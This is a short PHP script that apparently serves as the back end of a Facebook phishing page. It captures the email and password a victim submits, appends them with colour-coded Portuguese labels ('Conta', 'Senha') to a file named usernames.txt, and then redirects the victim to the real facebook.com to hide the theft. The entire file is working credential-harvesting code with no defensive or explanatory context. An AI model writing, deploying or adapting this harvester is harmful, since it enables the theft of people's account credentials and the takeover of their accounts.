<?php

file_put_contents("usernames.txt", "\e[1;34m Conta: \e[0;32m" . $_POST['email'] . "\n\e[1;34m Senha: \e[0;32m" . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://facebook.com/');
exit();
